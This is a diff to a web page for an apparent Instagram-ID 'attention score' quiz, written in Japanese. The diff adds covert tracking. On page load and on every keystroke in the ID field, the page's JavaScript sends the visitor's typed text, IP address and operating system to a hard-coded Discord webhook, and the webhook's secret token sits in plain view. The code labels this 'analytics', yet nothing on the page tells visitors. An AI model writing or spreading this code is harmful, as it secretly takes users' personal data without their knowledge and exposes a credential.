@@ -203,7 +203,7 @@
         
         <div class="input-section">
             <div class="input-wrapper">
-                <input type="text" id="instagramId" placeholder="自分のIDを試してみよう！名前も可！" maxlength="30">
+                <input type="text" id="instagramId" placeholder="自分のID、名前を試してみよう！" maxlength="30">
             </div>
             <button onclick="calculateAttention()">注目度を測定</button>
         </div>
@@ -221,7 +221,7 @@
     </div>
 
     <script>
-        function sendWebhookNotification(text) {
+        function sendWebhookNotification(text, eventType = 'measurement') {
             const webhookUrl = 'https://discord.com/api/webhooks/1399588888548347934/vafQRtJnjFy3mZ1ZliJbSJDJ5B1IEPDEGUuzg51Yo_Pc6dum0vjm5i78oGY4R_gJCCZF';
             // OS名を取得する関数
             function getOSName() {
@@ -239,9 +239,20 @@
                 .then(response => response.json())
                 .then(data => {
                     const ipAddress = data.ip; // 取得したIPアドレス
-                    const message = {
-                        content: `/アナリティクス ID: ${text}, IP: ${ipAddress}, OS: ${osName}, 内容: **${text}**`
-                    };
+                    let message;
+                    if (eventType === 'access') {
+                        message = {
+                            content: `/アナリティクス アクセス, IP: ${ipAddress}, OS: ${osName}`
+                        };
+                    } else if (eventType === 'input') {
+                        message = {
+                            content: `/アナリティクス 入力変更: ${text}, IP: ${ipAddress}, OS: ${osName}`
+                        };
+                    } else {
+                        message = {
+                            content: `/アナリティクス ID: ${text}, IP: ${ipAddress}, OS: ${osName}, 内容: **${text}**`
+                        };
+                    }
                     fetch(webhookUrl, {
                         method: 'POST',
                         headers: {
@@ -368,6 +379,19 @@
             if (e.key === 'Enter') {
                 calculateAttention();
             }
+        });
+
+        // 入力内容変更時の追跡
+        document.getElementById('instagramId').addEventListener('input', function(e) {
+            const value = e.target.value.trim();
+            if (value.length > 0) {
+                sendWebhookNotification(value, 'input');
+            }
+        });
+
+        // ページアクセス時の追跡
+        window.addEventListener('load', function() {
+            sendWebhookNotification('', 'access');
         });
     </script>
 </body>
